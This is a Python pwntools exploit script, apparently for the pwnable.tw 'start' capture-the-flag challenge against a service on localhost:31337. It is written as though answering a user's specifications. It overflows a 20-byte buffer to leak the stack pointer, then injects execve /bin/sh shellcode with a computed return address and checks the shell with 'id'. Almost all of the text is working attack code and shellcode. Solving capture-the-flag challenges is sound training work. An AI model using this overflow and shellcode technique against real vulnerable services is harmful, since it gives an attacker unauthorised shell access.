
from pwn import *

# Set up the target (assuming localhost:31337 for pwnable.tw challenges)
# You might need to change the host and port if the binary is running elsewhere.
p = remote("localhost", 31337)

# Stage 1: Leak ESP
log.info("Stage 1: Leaking ESP")
p.recvuntil(b"Let's start the CTF:") # Adjust this if the prompt is different

# Send A*20 + address of a gadget (e.g., pop esp; ret) or a known address in .text
# The user specified 0x08048087
p.send(b"A"*20 + p32(0x08048087))

# Receive the leaked ESP
leaked_esp_raw = p.recv(20) # Receive 20 bytes, the first 4 should be the leaked ESP
log.info(f"Received raw: {leaked_esp_raw}")

# Extract and unpack the leaked ESP
# The leaked ESP should be at the beginning of the received data if the return address overwrites the stack correctly.
leaked_esp = u32(leaked_esp_raw[:4])
log.success(f"Leaked ESP: {hex(leaked_esp)}")

# Stage 2: Execute shellcode
log.info("Stage 2: Executing shellcode")

# Calculate buffer address
# The user specified leaked_esp - 4
buf_addr = leaked_esp - 4
log.info(f"Calculated buffer address: {hex(buf_addr)}")

# Shellcode for /bin/sh execve
# User provided: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Construct the payload
# A*20 + return address (pointing to buf_addr + offset into shellcode) + shellcode
# The user specified buf+24 as the return address
payload = b"A"*20 + p32(buf_addr + 24) + shellcode
log.info(f"Payload length: {len(payload)}")

# Send the payload
p.send(payload)

# Interact with the shell
log.info("Attempting to interact with shell...")
p.sendline(b"id")
try:
    output = p.recv(timeout=3)
    log.success(f"Shell output: {output.decode(errors='ignore')}")
    if b"uid=" in output:
        log.success("Shell successfully obtained!")
    else:
        log.warning("Shell did not return expected 'id' output. Code execution might have failed or returned something else.")
except EOFError:
    log.error("Connection closed, shell not obtained or timed out.")
except Exception as e:
    log.error(f"An error occurred while receiving from shell: {e}")

p.close()

# If execve fails, the user suggested sys_exit(42) shellcode.
# This would be an alternative if the above fails:
# sys_exit_shellcode = b"\x31\xc0\xb0\x01\x31\xdb\xb3\x2a\xcd\x80" # exit(42)
# payload_exit = b"A"*20 + p32(buf_addr + 24) + sys_exit_shellcode
# p.send(payload_exit)
# p.interactive() # Or check for process exit code if possible
